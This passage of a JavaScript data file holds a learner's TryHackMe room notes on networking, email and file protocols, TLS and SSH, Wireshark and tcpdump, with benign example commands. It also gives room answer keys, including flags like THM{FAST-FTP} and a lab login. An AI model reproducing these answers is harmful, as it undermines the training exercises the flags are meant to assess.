  192.168.0.129   | 15401         | 212.3.4.5    | 19273
  192.168.0.130   | 49152         | 212.3.4.5    | 19274
  192.168.0.10    | 33021         | 212.3.4.5    | 19275

CAPACITY:
  → Port numbers use 2 bytes = 65,535 values
  → Each public IP can theoretically support ~65,000 simultaneous TCP connections
  → In practice: one NAT router can serve an entire home/office network

PRIVACY BENEFIT:
  → External servers only see the PUBLIC IP of the router
  → They CANNOT see the private IPs of individual devices

LIMITATION:
  → Cannot initiate connections FROM the internet to private devices
  → (unless port forwarding is configured on the router)

ALL HOME DEVICES use NAT — your ISP gives you ONE public IP and your router NATs all devices.`,
        commands: [
          '// Check your public IP (Linux):',
          'curl ifconfig.me',
          '// Check your private IP:',
          'ip a s',
          '// On Windows:',
          'ipconfig',
        ],
        answer: "212.3.4.5",
      },
    ],
    tools: ["ping", "traceroute", "arp", "dhclient", "tcpdump"],
    mitre: [
      "T1557.002 — ARP Cache Poisoning (Man-in-the-Middle)",
      "T1018 — Remote System Discovery (ping sweep)",
      "T1590 — Gather Victim Network Information",
    ],
    personalNotes:
      "DORA acronym is exam gold — Discover, Offer, Request, Acknowledge. ARP Request to ff:ff:ff:ff:ff:ff is broadcast. EIGRP = Cisco proprietary (always a trick question). NAT allows ~65K simultaneous connections per public IP. traceroute uses TTL decrement — when TTL=0 the router sends ICMP Time Exceeded.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "networking-core-protocols",
    title: "Networking Core Protocols",
    platform: "TryHackMe",
    category: "Networking",
    difficulty: "Easy",
    icon: "🌐",
    completed: true,
    tags: ["DNS", "HTTP", "FTP", "SMTP", "POP3", "IMAP", "WHOIS", "Telnet"],
    overview:
      "Learn about the core TCP/IP protocols: DNS (domain name resolution), WHOIS (domain registration info), HTTP/HTTPS (web browsing), FTP (file transfer), SMTP (sending email), POP3 (receiving email), and IMAP (synchronizing email). Includes hands-on with telnet to interact with each service.",
    keyLearnings: [
      "DNS uses UDP port 53 (default) and TCP port 53 (fallback); operates at Layer 7",
      "DNS record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail server)",
      "WHOIS provides domain registration info including registrant name, email, creation date",
      "HTTP = Hypertext Transfer Protocol; HTTPS = HTTP over TLS; ports 80/443",
      "HTTP methods: GET (retrieve), POST (submit), PUT (create/update), DELETE (remove)",
      "FTP uses TCP port 21 for control; data transfer uses a separate connection",
      "SMTP (send email) = port 25; HELO/EHLO → MAIL FROM → RCPT TO → DATA → '.'",
      "POP3 (receive email) = port 110; downloads and optionally deletes from server",
      "IMAP (sync email) = port 143; keeps messages on server, syncs across multiple devices",
    ],
    tasks: [
      {
        num: 1,
        title: "DNS — Domain Name System",
        notes: `WHY DNS EXISTS:
  → Humans remember names (google.com) not IP addresses (142.250.185.46)
  → DNS translates domain names to IP addresses automatically

DNS RECORD TYPES:
  A Record    → maps hostname to IPv4 address (e.g. example.com → 93.184.215.14)
  AAAA Record → maps hostname to IPv6 address (quad-A = for IPv6)
  CNAME Record → maps domain name to ANOTHER domain name (alias)
                 e.g. www.example.com → example.com
  MX Record   → specifies mail server for a domain (for sending email TO that domain)

DNS OPERATION:
  → Browser wants to load example.com
  → Browser queries DNS server for A record of example.com
  → DNS server returns IP address
  → Browser connects to that IP

TECHNICAL DETAILS:
  → DNS is Application Layer (Layer 7)
  → Default transport: UDP port 53
  → Fallback (large responses): TCP port 53
  → Query sends both A and AAAA requests simultaneously

CHECKING DNS FROM COMMAND LINE:
  nslookup example.com            → lookup using system's default DNS
  nslookup example.com 1.1.1.1   → lookup using Cloudflare's DNS (1.1.1.1)`,
        commands: [
          'nslookup example.com',
          'nslookup example.com 1.1.1.1',
          'nslookup -type=MX gmail.com',
          'nslookup -type=AAAA example.com',
          '// Linux alternative:',
          'dig example.com',
          'dig example.com MX',
          'dig example.com AAAA',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "WHOIS",
        notes: `WHOIS — DEFINITION:
A query/response protocol used to query databases that store the registered users/assignees of an internet resource (domain names, IP addresses, etc.).

Note: WHOIS is NOT an acronym despite being written in capitals; pronounced "who is"

WHAT WHOIS PROVIDES:
  → Registrant name, organization, address, phone, email
  → Domain creation date
  → Last updated date
  → Expiration date
  → Registrar information
  → Name servers (DNS servers)

PRIVACY PROTECTION:
  → Many registrants use privacy services that replace their info with proxy information
  → Common: "Domains By Proxy" (GoDaddy), "WhoisGuard"
  → Still shows registrar, dates, and name servers

HOW TO USE:
  → Web: whois.domaintools.com, lookup.icann.org
  → Linux CLI: whois example.com

SECURITY USE CASES:
  → Passive reconnaissance on target domains
  → Find organization info, email addresses for phishing research
  → Check if a domain is newly registered (potential phishing domain)`,
        commands: [
          'whois example.com',
          'whois tryhackme.com',
          '// Check domain creation date, registrant info, name servers',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "HTTP and HTTPS",
        notes: `HTTP (Hypertext Transfer Protocol):
  → Layer 7 protocol defining how browsers communicate with web servers
  → Default port: TCP 80
  → All traffic sent in CLEARTEXT (visible to packet capturers!)

HTTP METHODS:
  GET    → retrieve data (web page, image, file)
  POST   → submit new data to server (login forms, file uploads)
  PUT    → create or UPDATE existing resource on server
  DELETE → delete a specified resource on server

HTTP FLOW (basic):
  1. Browser resolves DNS for domain name
  2. TCP 3-way handshake with server
  3. Browser sends HTTP request (GET / HTTP/1.1)
  4. Server responds (HTTP/1.1 200 OK + content)
  5. Browser renders the page

HTTPS = HTTP OVER TLS:
  → Default port: TCP 443
  → All traffic is ENCRYPTED — cannot be read without decryption key
  → Adds TLS handshake step between TCP handshake and HTTP communication
  → Flow: DNS → TCP handshake → TLS handshake → HTTP communication

RAW HTTP REQUEST VIA TELNET:
  telnet MACHINE_IP 80
  GET / HTTP/1.1
  Host: example.com
  [blank line]`,
        commands: [
          '// Connect to HTTP server via telnet:',
          'telnet MACHINE_IP 80',
          '// After connecting, type:',
          'GET / HTTP/1.1',
          'Host: anything',
          '// [press Enter twice]',
          '// Connect to HTTPS server (needs SSL):',
          'openssl s_client -connect example.com:443',
        ],
        answer: "THM{TELNET-HTTP}",
      },
      {
        num: 4,
        title: "FTP — File Transfer Protocol",
        notes: `FTP (File Transfer Protocol):
  → Designed specifically for EFFICIENT FILE TRANSFER
  → Can achieve higher speeds than HTTP for file transfers
  → Default port: TCP 21 (CONTROL connection)
  → Data transfer: separate connection from client to server

KEY FTP COMMANDS:
  USER <username>  → provide username
  PASS <password>  → provide password
  LIST (or ls)     → list files in current directory
  RETR <filename>  → DOWNLOAD file from server to client
  STOR <filename>  → UPLOAD file from client to server
  type ascii       → switch to ASCII mode (for text files)
  type binary      → switch to binary mode (for executables, images)
  get <file>       → download a file (in ftp client)
  put <file>       → upload a file (in ftp client)
  quit             → disconnect

ANONYMOUS FTP:
  → Many FTP servers allow "anonymous" as username
  → No password required (just press Enter)
  → Access to public files

FTP PASSIVE vs ACTIVE MODE:
  Active  → server initiates data connection back to client
  Passive → client initiates BOTH connections (better for firewalls)
  "PASV" or "Passive Mode" in FTP output = passive mode

SECURITY NOTE: FTP credentials transmitted in PLAINTEXT → use SFTP or FTPS instead`,
        commands: [
          'ftp MACHINE_IP',
          '// After connecting:',
          '// Name: anonymous',
          '// Password: [just press Enter]',
          'ls',
          'type ascii',
          'get coffee.txt',
          'get flag.txt',
          'quit',
          '// Non-interactive:',
          'wget ftp://MACHINE_IP/flag.txt',
        ],
        answer: "THM{FAST-FTP}",
      },
      {
        num: 5,
        title: "SMTP — Sending Email",
        notes: `SMTP (Simple Mail Transfer Protocol):
  → Defines how mail clients talk to mail servers
  → AND how mail servers talk to each other
  → Default port: TCP 25
  → Analogy: like going to the post office to send a package

KEY SMTP COMMANDS:
  HELO or EHLO <domain>   → initiates SMTP session (EHLO = extended SMTP)
  MAIL FROM: <email>      → specifies sender's email address
  RCPT TO: <email>        → specifies recipient's email address
  DATA                    → signals client will start sending email content
  .                       → sent on its OWN LINE to indicate END of email body
  QUIT                    → close connection

SMTP SESSION FLOW:
  1. Client connects → server sends banner (220...)
  2. Client: HELO client.thm → Server: 250 Hello
  3. Client: MAIL FROM: <user@domain.com> → Server: 250 OK
  4. Client: RCPT TO: <recipient@domain.com> → Server: 250 Accepted
  5. Client: DATA → Server: 354 Enter message...
  6. Client: [writes email content including headers]
  7. Client: . (single period on its own line) → Server: 250 OK (email queued)
  8. Client: QUIT → Server: 221 Closing

EMAIL HEADERS (inside DATA):
  From: sender@example.com
  To: recipient@example.com
  Subject: Subject line
  [blank line]
  [email body]`,
        commands: [
          '// Connect to SMTP server:',
          'telnet MACHINE_IP 25',
          '// After connecting:',
          'HELO client.thm',
          'MAIL FROM: <user@client.thm>',
          'RCPT TO: <target@server.thm>',
          'DATA',
          'From: user@client.thm',
          'To: target@server.thm',
          'Subject: Test',
          '',
          'Hello, this is a test email!',
          '.',
          'QUIT',
        ],
        answer: "DATA",
      },
      {
        num: 6,
        title: "POP3 and IMAP — Receiving Email",
        notes: `─── POP3 (Post Office Protocol v3) ───
Port: TCP 110
Purpose: Retrieve email messages from server TO local client

ANALOGY: Like checking your personal PO box — you take the mail home (downloads and often deletes from server)

KEY POP3 COMMANDS:
  USER <username>         → identify user
  PASS <password>         → provide password
  STAT                    → request number of messages and total size
  LIST                    → list all messages and their sizes
  RETR <message_number>   → retrieve (download) the specified message
  DELE <message_number>   → mark message for deletion
  QUIT                    → end session (applies deletions)

LIMITATION: Designed for ONE device — downloads and removes from server

─── IMAP (Internet Message Access Protocol) ───
Port: TCP 143
Purpose: SYNCHRONIZE email across MULTIPLE devices

ANALOGY: Email stays on server, all devices see same state — read/deleted/moved syncs everywhere

KEY IMAP COMMANDS:
  LOGIN <user> <pass>     → authenticate
  SELECT <mailbox>        → select mailbox folder (e.g. SELECT inbox)
  FETCH <num> body[]      → fetch message number and body
  MOVE <set> <mailbox>    → move messages to another mailbox
  COPY <set> <mailbox>    → copy messages to another mailbox
  LOGOUT                  → log out

IMAP vs POP3:
  POP3 → downloads & deletes, works on ONE device, less server storage
  IMAP → syncs, works on MANY devices, keeps messages on server (more storage)

LOGIN CREDENTIALS FOR THIS ROOM:
  Username: linda | Password: Pa$$123`,
        commands: [
          '// POP3 via telnet:',
          'telnet MACHINE_IP 110',
          'USER linda',
          'PASS Pa$$123',
          'STAT',
          'LIST',
          'RETR 1',
          'QUIT',
          '// IMAP via telnet:',
          'telnet MACHINE_IP 143',
          'A LOGIN strategos',
          'B SELECT inbox',
          'C FETCH 3 body[]',
          'D LOGOUT',
        ],
        answer: "FETCH 4 body[]",
      },
    ],
    tools: ["telnet", "ftp", "nslookup", "whois", "dig"],
    mitre: [
      "T1071.001 — Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
      "T1071.003 — Application Layer Protocol: Mail Protocols (SMTP/POP3/IMAP)",
      "T1071.002 — Application Layer Protocol: File Transfer (FTP)",
    ],
    personalNotes: `Protocol port numbers - MEMORIZE:
TELNET=23, DNS=53, HTTP=80, HTTPS=443, FTP=21,
SMTP=25, POP3=110, IMAP=143.
SMTP ends email body with a single period (.) on its own line.
IMAP uses: A LOGIN → B SELECT inbox → C FETCH <n> body[] → D LOGOUT.
POP3 uses: USER → PASS → STAT → LIST → RETR <n> → QUIT.`,
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "networking-secure-protocols",
    title: "Networking Secure Protocols",
    platform: "TryHackMe",
    category: "Networking",
    difficulty: "Easy",
    icon: "🔒",
    completed: true,
    tags: ["TLS", "SSL", "HTTPS", "SFTP", "FTPS", "SSH", "VPN", "Certificates"],
    overview:
      "Learn how TLS, SSH, and VPN secure network traffic. Covers the TLS handshake, certificate authorities, HTTPS over TLS, securing SMTP/POP3/IMAP with TLS, SSH vs Telnet, SFTP/FTPS for secure file transfer, and VPN for private networks over the internet.",
    keyLearnings: [
      "TLS = Transport Layer Security — protects confidentiality, integrity, and authenticity",
      "SSL was developed by Netscape (1995); TLS 1.0 upgraded SSL 3.0 in 1999; TLS 1.3 in 2018",
      "TLS operates at the transport layer (Layer 4 of OSI)",
      "Certificate Authority (CA) signs certificates to prove server identity",
      "Self-signed certificates cannot prove server authenticity — no third-party validation",
      "HTTPS=443, SMTPS=465/587, POP3S=995, IMAPS=993",
      "SSH developed by Tatu Ylönen in 1995; OpenSSH released by OpenBSD in 1999",
      "SSH listens on port 22 | Telnet on port 23",
      "SFTP = SSH File Transfer Protocol — same port 22 as SSH",
      "FTPS = FTP over TLS — uses port 990; requires certificate; trickier with strict firewalls",
      "VPN creates encrypted tunnel over internet; devices appear to be on same private network",
    ],
    tasks: [
      {
        num: 1,
        title: "TLS — Transport Layer Security",
        notes: `WHY TLS WAS CREATED:
Before TLS: anyone with packet capture could read ALL network traffic including passwords.

HISTORY:
  1995 → SSL 2.0 (first public version by Netscape Communications)
  1999 → TLS 1.0 (IETF upgrade to SSL 3.0)
  2018 → TLS 1.3 (major overhaul — current standard)
  Note: SSL is TLS's PREDECESSOR — TLS "upgraded and built upon" SSL

WHAT TLS PROVIDES:
  CONFIDENTIALITY → encrypts data; nobody can read it without the key
  INTEGRITY       → nobody can modify data in transit
  AUTHENTICITY    → verified you're talking to the REAL server (via certificates)

TLS CERTIFICATE SYSTEM:
  1. Server admin creates a Certificate Signing Request (CSR)
  2. CSR submitted to a Certificate Authority (CA)
  3. CA verifies identity and issues a DIGITAL CERTIFICATE
  4. Certificate installed on server to identify it to others
  5. Clients verify certificate using CA certificates pre-installed in browser/OS

SELF-SIGNED CERTIFICATES:
  → Created by the server itself (no CA involved)
  → CANNOT prove server authenticity — no third-party verification
  → Browser shows "This site is not secure" warning
  → Only acceptable for internal/lab use

LET'S ENCRYPT:
  → Free certificate authority (CA)
  → Provides automatically-renewable TLS certificates

GETTING THE KEY (Wireshark decryption):
  → Chromium: --ssl-key-log-file=~/ssl-key.log
  → Configure Wireshark: Edit → Preferences → TLS → (Pre)-Master-Secret log filename`,
        commands: [
          '// Test TLS connection:',
          'openssl s_client -connect example.com:443',
          '// Check certificate details:',
          'openssl s_client -connect example.com:443 | openssl x509 -noout -text',
          '// Chromium with TLS key logging:',
          'chromium --ssl-key-log-file=~/ssl-key.log',
        ],
        answer: "SSL",
      },
      {
        num: 2,
        title: "HTTPS, SMTPS, POP3S, IMAPS",
        notes: `ADDING TLS TO PROTOCOLS:
When TLS is added to a protocol, an "S" for Secure is appended.

PORT NUMBERS (INSECURE → SECURE):
  HTTP  port 80  → HTTPS   port 443
  SMTP  port 25  → SMTPS   port 465 and 587
  POP3  port 110 → POP3S   port 995
  IMAP  port 143 → IMAPS   port 993

HOW HTTPS WORKS (connection steps):
  1. DNS resolution (domain → IP)
  2. TCP three-way handshake (SYN, SYN-ACK, ACK)
  3. TLS handshake (8 packets in example in room)
  4. HTTP communication (encrypted as "Application Data" in Wireshark)

WITHOUT TLS (HTTP):
  → Wireshark shows ALL request/response content in plaintext
  → Passwords, form data, cookies all visible

WITH TLS (HTTPS):
  → Wireshark shows only "Application Data" — all content encrypted
  → Only visible with private key or key log file

WHICH IS INSECURE AND LEAKS CREDENTIALS?
  → IMAP (port 143) — no TLS, credentials sent in cleartext
  → SMTPS, POP3S have TLS — credentials are protected
  → Exam trick: regular IMAP leaks credentials; IMAPS does not

TLS can be added to MANY other protocols: DNS→DoT, MQTT→MQTTS, SIP→SIPS`,
        commands: [
          '// Test SMTPS:',
          'openssl s_client -connect mail.example.com:465',
          '// Test POP3S:',
          'openssl s_client -connect mail.example.com:995',
          '// Test IMAPS:',
          'openssl s_client -connect mail.example.com:993',
        ],
        answer: "IMAP",
      },
      {
        num: 3,
        title: "SSH — Secure Shell",
        notes: `SSH — DEFINITION:
Secure Shell — protocol for secure remote access and file transfer.
Created by Tatu Ylönen in 1995 (same year SSL 2.0 was released).

WHY SSH REPLACED TELNET:
  → Telnet sends EVERYTHING in cleartext (passwords visible!)
  → SSH encrypts all communication end-to-end

OPENSSH:
  → Open-source implementation of SSH
  → Released by OpenBSD developers in 1999
  → Most SSH clients today are based on OpenSSH
  → Available on Linux, macOS, Windows (since Win10)

SSH FEATURES:
  1. Secure Authentication → password-based OR public key OR two-factor auth
  2. Confidentiality → end-to-end encryption; protects against eavesdropping
  3. Integrity → cryptography protects data integrity
  4. Tunneling → SSH creates secure "tunnel" to route other protocols through
  5. X11 Forwarding → run graphical apps on remote system, display locally

SSH CONNECTIONS:
  Port: 22 (Telnet = 23)
  Basic: ssh username@hostname
  Same user: ssh hostname (no username needed if same as local)
  Key-based: ssh -i keyfile.pem username@hostname
  X11: ssh -X username@hostname
  Port forwarding: ssh -L local_port:remote_host:remote_port username@hostname

WIRESHARK CAPTURES:
  → SSH session shows only encrypted data — cannot read content without key`,
        commands: [
          '// Basic SSH connection:',
          'ssh username@192.168.1.10',
          '// Specify key file:',
          'ssh -i ~/.ssh/id_rsa username@192.168.1.10',
          '// Connect on different port:',
          'ssh -p 2222 username@192.168.1.10',
          '// X11 forwarding (run graphical apps remotely):',
          'ssh -X username@192.168.1.10',
          '// Generate SSH key pair:',
          'ssh-keygen -t ed25519',
          '// Copy public key to server:',
          'ssh-copy-id username@192.168.1.10',
        ],
        answer: "OpenSSH",
      },
      {
        num: 4,
        title: "SFTP, FTPS, and VPN",
        notes: `─── SFTP (SSH File Transfer Protocol) ───
  → Part of the SSH protocol suite
  → Uses port 22 (same as SSH)
  → Secure file transfer via SSH encryption
  → Commands: get <file>, put <file>
  → Easy to set up — just enable in OpenSSH server config

─── FTPS (FTP Secure) ───
  → FTP over TLS (NOT the same as SFTP!)
  → Port: 990
  → Requires TLS certificate setup
  → Trickier with strict firewalls (uses separate control + data connections)
  → Still uses FTP commands but over encrypted channel

SFTP vs FTPS:
  SFTP  → uses SSH, port 22, simpler setup, more firewall-friendly
  FTPS  → uses TLS, port 990, requires certificate, trickier through firewalls

─── VPN (Virtual Private Network) ───
PURPOSE: Connect remote locations/users to a private network over the internet

USE CASES:
  1. Company branches → all connect to main branch over VPN
  2. Remote workers → connect single device to company network
  3. Privacy → hide real IP, bypass geo-restrictions, encrypt local ISP traffic

HOW VPN WORKS:
  → VPN client ENCRYPTS traffic and sends through a TUNNEL to VPN server
  → VPN server decrypts and forwards to internal network or internet
  → Devices appear to be physically located at the VPN server

PRIVACY BENEFITS:
  → External servers see VPN server's IP, not your real IP
  → Local ISP only sees encrypted traffic (can't censor or inspect)
  → Can bypass geographic content restrictions

SPLIT TUNNELING:
  → Some VPNs only route specific traffic through VPN
  → Others route ALL internet traffic through VPN tunnel

LEGAL WARNING: VPN usage is illegal in some countries — check local laws`,
        commands: [
          '// Connect via SFTP:',
          'sftp username@hostname',
          '// After connecting:',
          '// get remote_file.txt',
          '// put local_file.txt',
          '// ls, cd, pwd commands work like FTP',
          '// SCP (Secure Copy via SSH):',
          'scp file.txt username@hostname:/remote/path/',
          'scp username@hostname:/remote/file.txt /local/path/',
        ],
        answer: "VPN",
      },
    ],
    tools: ["openssl", "ssh", "sftp", "scp"],
    mitre: [
      "T1021.004 — Remote Services: SSH",
      "T1573 — Encrypted Channel (TLS)",
      "T1572 — Protocol Tunneling (SSH tunneling)",
    ],
    personalNotes:
      "TLS port mapping is exam-critical: HTTPS=443, SMTPS=465/587, POP3S=995, IMAPS=993. SSH=22, Telnet=23. SFTP is NOT the same as FTPS — SFTP uses SSH (port 22), FTPS uses TLS (port 990). Self-signed certificate = cannot prove server authenticity.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "wireshark-the-basics",
    title: "Wireshark: The Basics",
    platform: "TryHackMe",
    category: "Network Forensics",
    difficulty: "Easy",
    icon: "🦈",
    completed: true,
    tags: ["Wireshark", "PCAP", "Packet Analysis", "Display Filters", "Protocol Dissection", "Traffic Analysis"],
    overview:
      "Learn the basics of Wireshark — the most powerful open-source network packet analyser. Covers the GUI, loading PCAP files, packet dissection across OSI layers, packet navigation, filtering (Apply as Filter, Follow Stream), and export capabilities.",
    keyLearnings: [
      "Wireshark is NOT an IDS — it only captures and displays packets, cannot modify them",
      "Two capture files: http1.pcapng (screenshots) and Exercise.pcapng (questions)",
      "Packet List Pane → Packet Details Panel → Packet Bytes Pane",
      "Packet Details shows: Frame (L1), Source MAC (L2), Source IP (L3), Protocol (L4), App Protocol (L7)",
      "Display filters vs Capture filters: display = viewing, capture = what to capture",
      "Golden rule: 'If you can click on it, you can filter and copy it'",
      "Follow Stream reconstructs complete conversations at application level",
      "Export Objects extracts files from network captures (HTTP, SMB, FTP, etc.)",
      "Expert Info in status bar shows anomalies: Chat (blue), Note (cyan), Warn (yellow), Error (red)",
      "Ctrl+G = Go to packet | Ctrl+F = Find packet",
    ],
    tasks: [
      {
        num: 1,
        title: "Tool Overview and GUI",
        notes: `WIRESHARK — USE CASES:
  1. Detecting and troubleshooting network problems (load failures, congestion)
  2. Detecting security anomalies (rogue hosts, suspicious port usage, unusual traffic)
  3. Investigating and learning protocol details (response codes, payload data)

NOT AN IDS:
  → Wireshark ONLY discovers and investigates packets
  → Does NOT modify packets
  → Detection depends on the ANALYST's knowledge

GUI SECTIONS:
  1. Toolbar          → menus and shortcuts for filtering, sorting, merging, exporting
  2. Display Filter Bar → main query and filtering section
  3. Recent Files     → recently analyzed files (double-click to reload)
  4. Capture Filter and Interfaces → where to capture traffic from
  5. Status Bar       → tool status, profile, packet count

THREE PACKET PANES (once file is loaded):
  Packet List Pane   → summary: source/dest, protocol, info per packet
  Packet Details Panel → expandable protocol breakdown of selected packet
  Packet Bytes Pane  → hex + ASCII representation of packet bytes

PACKET COLOURING:
  → Packets are colour-coded by protocol (green = TCP, etc.)
  → Temporary rules: right-click → Conversation Filter
  → Permanent rules: View → Coloring Rules
  → "Colourise Packet List" activates/deactivates all colouring

TRAFFIC SNIFFING:
  Blue shark button  → START capture
  Red button         → STOP capture
  Green button       → RESTART capture`,
        commands: [
          '// Open Wireshark from CLI:',
          'wireshark',
          '// Open a pcap file directly:',
          'wireshark -r capture.pcap',
          '// Open specific interface capture:',
          'wireshark -i eth0',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Packet Dissection",
        notes: `PACKET DISSECTION (Protocol Dissection):
Investigates packet details by decoding protocols and fields.

HOW TO ACCESS:
  → Single-click: opens in Packet Details Panel (bottom-left)
  → Double-click: opens details in a NEW WINDOW

PACKET LAYERS (for an HTTP packet):
  Layer 1 — Frame/Packet:
  → Physical layer details (frame number, capture time, frame length, protocols in frame)

  Layer 2 — Source [MAC]:
  → Data Link layer (source MAC, destination MAC, EtherType)
  → Shows vendor OUI in MAC address

  Layer 3 — Source [IP]:
  → Network layer (source IPv4, destination IPv4, TTL, protocol)

  Layer 4 — Protocol:
  → Transport layer (TCP/UDP, source port, destination port, sequence numbers, flags)

  Protocol Errors:
  → TCP segments that needed reassembly

  Layer 5-7 — Application Protocol:
  → HTTP request/response details (method, URI, headers, status code)

  Application Data:
  → Raw application-level data payload

INTERACTION:
  → Click any field in Packet Details → highlights corresponding bytes in Packet Bytes pane
  → Expand/collapse sections by clicking arrows`,
        commands: [
          '// Wireshark display filter by layer:',
          'eth.addr == aa:bb:cc:dd:ee:ff    // Layer 2 MAC filter',
          'ip.src == 192.168.1.1            // Layer 3 source IP',
          'tcp.port == 80                   // Layer 4 TCP port',
          'http                             // Layer 7 HTTP filter',
          'http.request.method == "GET"     // Specific HTTP method',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Packet Navigation and Search",
        notes: `PACKET NAVIGATION:

Go to Packet:
  → Edit → Go to Packet → enter packet number
  → Or: Ctrl + G
  → Useful for large captures

Find Packets:
  → Edit → Find Packet (Ctrl + F)
  → Input types: Display filter, Hex, String, Regex
  → Search fields: Packet list, Packet details, Packet bytes
  → Case sensitivity can be set

Mark Packets:
  → Mark packets for further investigation
  → Edit → Mark/Unmark packet (or right-click)
  → Marked packets: shown in BLACK (overrides colour rules)
  → ⚠ Marks are LOST when file is closed (not saved to pcap)

Packet Comments:
  → Add notes to specific packets
  → Unlike marks, comments ARE SAVED within the pcap file
  → Right-click → Packet Comment

Export Packets:
  → File → Export Specified Packets
  → Export marked, displayed, or range of packets
  → Creates a new pcap with only selected packets

Export Objects (Files):
  → File → Export Objects → select protocol (HTTP, SMB, TFTP, etc.)
  → Extracts files transferred over the network
  → Available for: DICOM, HTTP, IMF, SMB, TFTP

EXPERT INFO:
  → Analyse → Expert Information (or bottom-left status bar)
  → Severity levels:
    Chat (Blue)   → normal workflow info
    Note (Cyan)   → notable events (app error codes)
    Warn (Yellow) → unusual errors or problem statements
    Error (Red)   → malformed packets, critical problems`,
        commands: [
          '// Navigate to specific packet: Ctrl + G',
          '// Find specific text: Ctrl + F',
          '// Common filter examples:',
          'frame.number == 38             // go to specific packet by number',
          'frame.comment                  // show packets with comments',
          '// Export objects: File → Export Objects → HTTP',
        ],
        answer: "1636",
      },
      {
        num: 4,
        title: "Packet Filtering",
        notes: `TWO TYPES OF FILTERS:
  Capture Filters → capture ONLY specific packets (applied before capture starts)
  Display Filters → view only specific packets from an already-captured file

METHODS TO APPLY DISPLAY FILTERS:
  1. Apply as Filter    → right-click field → Apply as Filter
  2. Conversation Filter → right-click → Conversation Filter (shows all packets for that connection)
  3. Colourise Conversation → highlights without hiding other packets
  4. Prepare as Filter  → right-click → adds to filter bar but doesn't apply yet
  5. Apply as Column    → adds field as visible column in packet list
  6. Follow Stream      → reconstructs full conversation at application level

FOLLOW STREAM:
  → Analyse → Follow → TCP/UDP/HTTP Stream
  → Shows raw application data in separate dialogue
  → Red = client packets | Blue = server packets
  → Automatically applies display filter for that stream
  → Remove filter: click X on display filter bar

SIMPLE DISPLAY FILTERS:
  http              → show only HTTP packets
  tcp.port == 80    → show TCP port 80
  udp.port == 53    → show DNS traffic
  ip.addr == 10.0.0.1 → filter by IP address
  ip.src == 10.0.0.1  → filter by source IP
  ip.dst == 10.0.0.1  → filter by destination IP

COMBINING FILTERS:
  http and ip.addr == 10.0.0.1    → HTTP from specific IP
  tcp.port == 80 or tcp.port == 443 → HTTP or HTTPS

GOLDEN RULE:
  "If you can click on it, you can filter and copy it"`,
        commands: [
          '// Common Wireshark display filters:',
          'http',
          'http.request.method == "POST"',
          'tcp.port == 80',
          'ip.addr == 192.168.1.1',
          'ip.src == 10.0.0.1',
          'dns',
          'ftp',
          'smtp',
          '// Follow stream: right-click packet → Follow → TCP Stream',
          '// Remove stream filter: click X in filter bar',
        ],
        answer: "3",
      },
    ],
    tools: ["Wireshark"],
    mitre: [
      "T1040 — Network Sniffing",
      "T1046 — Network Service Discovery",
    ],
    personalNotes:
      "Wireshark is NOT an IDS — analysts must know what to look for. Follow Stream is the most powerful feature for reconstructing attacks. Export Objects to recover files transferred over HTTP/SMB. Expert Info is the first place to look for anomalies. Display filter golden rule: 'If you can click it, you can filter it.'",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "tcpdump-the-basics",
    title: "Tcpdump: The Basics",
    platform: "TryHackMe",
    category: "Network Forensics",
    difficulty: "Easy",
    icon: "📡",
    completed: true,
    tags: ["tcpdump", "libpcap", "PCAP", "Packet Capture", "Network Analysis", "CLI"],
    overview:
      "Learn how to use Tcpdump — the command-line packet capture tool built on libpcap. Covers basic capture options, filtering by host/port/protocol, logical operators, advanced TCP flag filtering, and packet display options (ASCII, hex, combined).",
    keyLearnings: [
      "tcpdump and libpcap written in C/C++; released for Unix-like systems in late 1980s/early 1990s",
      "libpcap = foundation library; ported to Windows as winpcap",
      "-i = interface | -w = write to file | -r = read from file | -c = count | -n = no DNS resolution",
      "-nn = no DNS AND no port name resolution",
      "-v/-vv/-vvv = increasing verbosity levels",
      "Filters: host, src host, dst host, port, src port, dst port, protocol",
      "Logical: and, or, not",
      "tcp[tcpflags] == tcp-syn captures only SYN packets",
      "-A = show in ASCII | -xx = show in hex | -X = hex + ASCII | -e = include MAC addresses",
      "-q = quick/brief output",
    ],
    tasks: [
      {
        num: 1,
        title: "Basic Packet Capture",
        notes: `TCPDUMP — FOUNDATION:
  → Built on libpcap library (C/C++)
  → Released for Unix-like systems late 1980s/early 1990s
  → libpcap ported to Windows as winpcap
  → Foundation for many other networking tools (Wireshark, etc.)

BASIC OPTIONS:
  -i INTERFACE    → specify network interface to listen on
  -i any          → listen on ALL interfaces
  -i eth0         → listen on specific interface

  -w FILE.pcap    → write captured packets to file (instead of displaying)
  -r FILE.pcap    → read and analyze packets from an existing file

  -c COUNT        → capture exactly N packets, then stop
                    (without -c, runs until Ctrl+C)

  -n              → don't resolve IP addresses (no DNS lookups)
  -nn             → don't resolve IPs AND don't resolve port numbers
                    (80 stays "80" instead of becoming "http")

  -v              → slightly more verbose output (TTL, total length, options)
  -vv             → more verbose
  -vvv            → even more verbose

LISTING INTERFACES:
  ip address show  (or ip a s) → shows available interfaces

COMMON EXAMPLES:
  sudo tcpdump -i eth0 -c 50 -v
  sudo tcpdump -i wlo1 -w data.pcap
  sudo tcpdump -i any -nn`,
        commands: [
          'ip a s                             // list available interfaces',
          'sudo tcpdump -i eth0              // capture on eth0',
          'sudo tcpdump -i any               // capture on all interfaces',
          'sudo tcpdump -i eth0 -c 100       // capture exactly 100 packets',
          'sudo tcpdump -i eth0 -w capture.pcap  // save to file',
          'tcpdump -r capture.pcap           // read from file (no sudo needed)',
          'sudo tcpdump -i eth0 -nn          // no DNS or port resolution',
          'sudo tcpdump -i eth0 -v           // verbose output',
          'sudo tcpdump -i eth0 -c 5 -n     // 5 packets, numeric only',
        ],
        answer: "libpcap",
      },
      {
        num: 2,
        title: "Filtering Expressions",
        notes: `FILTERING BY HOST:
  host IP              → packets TO or FROM specific IP
  host hostname        → packets to/from specific hostname
  src host IP          → packets FROM specific IP only
  dst host IP          → packets TO specific IP only
  Example: sudo tcpdump host example.com -w http.pcap

FILTERING BY PORT:
